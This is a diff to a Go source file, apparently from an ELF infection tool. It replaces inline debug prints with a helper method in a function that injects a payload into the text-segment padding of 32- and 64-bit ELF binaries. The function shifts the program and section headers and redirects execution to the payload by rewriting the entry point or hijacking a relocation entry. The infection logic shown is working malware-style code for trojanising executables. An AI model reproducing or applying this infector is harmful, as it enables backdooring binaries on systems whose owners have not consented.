@@ -28,7 +28,7 @@ const (
 )
 
 
-func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) error {
+func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 	var textSegEnd interface{}
 	var oShoff interface{}
 	
@@ -46,29 +46,30 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 		t.Hdr.(*elf.Header64).Shoff += uint64(PAGE_SIZE)
 		pHeaders := t.Phdrs.([]elf.Prog64)
 		
+		newEntry := pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
+
 		var origAddend int64
 		var relocEntry elf.Rela64
 
 		if (opts & CtorsHijack) == CtorsHijack {
-			if err := t.relativeRelocHook(&origAddend, &relocEntry, debug); err != nil {
+			if err := t.relativeRelocHook(&origAddend, &relocEntry, int64(newEntry)); err != nil {
 				return err
 			}
 			
 		}else {
-			t.Hdr.(*elf.Header64).Entry = pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
+			t.Hdr.(*elf.Header64).Entry = newEntry 
 		}
 
-		if debug {
-			fmt.Printf(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header64).Entry)
-		}
+		
+		t.printDebugMsg(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header64).Entry)
+	
 
 		textSegEnd = pHeaders[textNdx].Off + pHeaders[textNdx].Filesz
-		if debug {
-			fmt.Printf(TEXT_SEG_START, pHeaders[textNdx].Off)
-			fmt.Printf(TEXT_SEG_END, textSegEnd.(uint64))
-			fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
-		}
-
+		
+		t.printDebugMsg(TEXT_SEG_START, pHeaders[textNdx].Off)
+		t.printDebugMsg(TEXT_SEG_END, textSegEnd.(uint64))
+		t.printDebugMsg(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
+	
 		if !((opts & NoRest) == NoRest)  {
 			t.Payload.Write(restoration64)
 		}
@@ -83,48 +84,38 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 			t.Payload.Write(retStub)
 		}
 
-		if debug {
-			fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
+		
+		t.printDebugMsg(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
+		if t.Debug {
 			printPayload(t.Payload.Bytes())
 		}
 
 		t.Phdrs.([]elf.Prog64)[textNdx].Memsz += uint64(t.Payload.Len())
 		t.Phdrs.([]elf.Prog64)[textNdx].Filesz += uint64(t.Payload.Len())
 
-		if debug {
-			fmt.Println(GENERATE_AND_APPEND_PIC_STUB)
-			fmt.Printf(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
-		}
 
-		if debug {
-			fmt.Printf(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
-		}
+		t.printDebugMsg(GENERATE_AND_APPEND_PIC_STUB)
+		t.printDebugMsg(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
+		t.printDebugMsg(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
 
 		for j := textNdx; j < len(pHeaders); j++ {
 			if pHeaders[textNdx].Off < pHeaders[j].Off {
-				if debug {
-					fmt.Printf(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
-				}
+				t.printDebugMsg(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
 				t.Phdrs.([]elf.Prog64)[j].Off += uint64(PAGE_SIZE)
 			}
 		}
 
-		if debug {
-			fmt.Println(INCREASE_SECTION_HEADER_ADDRESS)
-		}
+		t.printDebugMsg(INCREASE_SECTION_HEADER_ADDRESS)
+
 		sectionHdrTable := t.Shdrs.([]elf.Section64)
 		sNum := int(t.Hdr.(*elf.Header64).Shnum)
 
 		for k := 0; k < sNum; k++ {
 			if sectionHdrTable[k].Off >= textSegEnd.(uint64) {
-				if debug {
-					fmt.Printf(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
-				}
+				t.printDebugMsg(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
 				t.Shdrs.([]elf.Section64)[k].Off += uint64(PAGE_SIZE)
 			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header64).Entry {
-				if debug {
-					fmt.Println(EXTEND_SECTION_HEADER_ENTRY)
-				}
+				t.printDebugMsg(EXTEND_SECTION_HEADER_ENTRY)
 				t.Shdrs.([]elf.Section64)[k].Size += uint64(t.Payload.Len())
 			}
 		}
@@ -136,28 +127,27 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 		t.Hdr.(*elf.Header32).Shoff += uint32(PAGE_SIZE)
 		pHeaders := t.Phdrs.([]elf.Prog32)
 		
+		newEntry := pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
+
 		var origAddend uint32
 		var relocEntry elf.Rel32
 
 		if (opts & CtorsHijack) == CtorsHijack {
-			if err := t.relativeRelocHook(&origAddend, &relocEntry, debug); err != nil {
+			if err := t.relativeRelocHook(&origAddend, &relocEntry, int32(newEntry)); err != nil {
 				return err
 			}
 			
 		}else {
-			t.Hdr.(*elf.Header32).Entry = pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
+			t.Hdr.(*elf.Header32).Entry = newEntry
 		}	
 		
-		if debug {
-			fmt.Printf(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header32).Entry)
-		}
+		t.printDebugMsg(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header32).Entry)
 
 		textSegEnd = pHeaders[textNdx].Off + pHeaders[textNdx].Filesz
-		if debug {
-			fmt.Printf(TEXT_SEG_START, pHeaders[textNdx].Off)
-			fmt.Printf(TEXT_SEG_END, textSegEnd.(uint32))
-			fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
-		}
+		
+		t.printDebugMsg(TEXT_SEG_START, pHeaders[textNdx].Off)
+		t.printDebugMsg(TEXT_SEG_END, textSegEnd.(uint32))
+		t.printDebugMsg(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
 
 		if !((opts & NoRest) == NoRest) {
 				t.Payload.Write(restoration32)
@@ -174,49 +164,36 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 			t.Payload.Write(retStub)
 		}
 		
-		if debug {
-			fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
+		t.printDebugMsg(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
+		if t.Debug {
 			printPayload(t.Payload.Bytes())
 		}
 
 		t.Phdrs.([]elf.Prog32)[textNdx].Memsz += uint32(t.Payload.Len())
 		t.Phdrs.([]elf.Prog32)[textNdx].Filesz += uint32(t.Payload.Len())
 
-		if debug {
-			fmt.Println(GENERATE_AND_APPEND_PIC_STUB)
-			fmt.Printf(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
-		}	
-
-		
-		if debug {
-			fmt.Printf(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
-		}
+		t.printDebugMsg(GENERATE_AND_APPEND_PIC_STUB)
+		t.printDebugMsg(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())	
+		t.printDebugMsg(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
 
 		for j := textNdx; j < len(pHeaders); j++ {
 			if pHeaders[textNdx].Off < pHeaders[j].Off {
-				if debug {
-					fmt.Printf(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
-				}
+				t.printDebugMsg(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
 				t.Phdrs.([]elf.Prog32)[j].Off += uint32(PAGE_SIZE)
 			}
 		}
 
-		if debug {
-			fmt.Println(INCREASE_SECTION_HEADER_ADDRESS)
-		}
+		t.printDebugMsg(INCREASE_SECTION_HEADER_ADDRESS)
+
 		sectionHdrTable := t.Shdrs.([]elf.Section32)
 		sNum := int(t.Hdr.(*elf.Header32).Shnum)
 
 		for k := 0; k < sNum; k++ {
 			if sectionHdrTable[k].Off >= textSegEnd.(uint32) {
-				if debug {
-					fmt.Printf(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
-				}
+				t.printDebugMsg(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
 				t.Shdrs.([]elf.Section32)[k].Off += uint32(PAGE_SIZE)
 			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header32).Entry {
-				if debug {
-					fmt.Println(EXTEND_SECTION_HEADER_ENTRY)
-				}
+				t.printDebugMsg(EXTEND_SECTION_HEADER_ENTRY)
 				t.Shdrs.([]elf.Section32)[k].Size += uint32(t.Payload.Len())
 			}
 		}
@@ -281,9 +258,7 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 
 	copy(finalInfectionTwo, finalInfection[:endOfInfection])
 
-	if debug {
-		fmt.Println("[+] writing payload into the binary")
-	}
+	t.printDebugMsg("[+] writing payload into the binary")
 
 	copy(finalInfectionTwo[endOfInfection:], t.Payload.Bytes())
 	copy(finalInfectionTwo[endOfInfection + PAGE_SIZE:], finalInfection[endOfInfection:])
